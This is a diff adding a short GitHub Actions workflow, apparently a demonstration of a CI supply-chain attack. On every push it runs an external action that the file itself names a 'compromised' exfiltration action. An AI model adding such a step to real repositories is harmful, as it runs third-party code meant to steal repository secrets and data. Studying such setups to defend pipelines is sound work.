@@ -1,0 +1,13 @@
+name: Use Exfiltration Action
+
+on: push
+
+jobs:
+  call_reusable_action:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v3
+
+      - name: 🔥 Use External Exfiltration Action
+        uses: jonra/actions/compromised-action@main  # ✅ References the reusable action
